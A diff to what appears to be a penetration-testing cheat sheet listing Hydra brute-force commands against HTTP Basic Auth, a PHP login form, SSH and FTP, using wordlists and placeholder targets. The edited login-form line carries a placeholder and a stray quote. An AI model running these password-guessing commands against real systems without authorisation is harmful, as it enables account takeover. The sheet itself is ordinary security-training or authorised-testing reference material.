@@ -5,7 +5,7 @@
 | `hydra -h` | hydra help |
 | `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
 | `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
-| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
+| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-form-post "/login.php:username=^USER^&password=^PASS^:F/S=<succeed or fail message>'"` | Login Form Brute Force - Static User, Pass Wordlist |
 | `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists |
 | `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
 
